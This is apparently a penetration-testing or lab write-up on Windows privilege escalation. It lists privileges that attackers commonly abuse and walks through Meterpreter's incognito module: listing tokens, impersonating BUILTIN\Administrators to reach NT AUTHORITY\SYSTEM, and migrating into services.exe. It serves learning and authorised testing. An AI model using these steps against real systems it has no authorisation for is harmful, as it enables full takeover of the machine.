We use whoami /priv on the compromised box to enumerate priviledges.

Commonly abused privs:

-   SeImpersonatePrivilege
-   SeAssignPrimaryPrivilege
-   SeTcbPrivilege
-   SeBackupPrivilege
-   SeRestorePrivilege
-   SeCreateTokenPrivilege
-   SeLoadDriverPrivilege
-   SeTakeOwnershipPrivilege
-   SeDebugPrivilege


---

We see that SeDebug and SeImpersonate are enabled
We can use the incognito module to exploit this
Use this command in meterpreter:
`load incognito`

---

Check which tokens are available
`list_tokens -g`

BUILTIN\Administrators is available

`impersonate_token "BUILTIN\Administrators"`

Run `getuid`
We are now NT AUTHORITY\SYSTEM

---

Next we need to migrate, preferably to services.exe
Now we have a root shell



adubs808: SeImpersonate is a good sign of a privesc vector. Usually service accounts will have that ability.

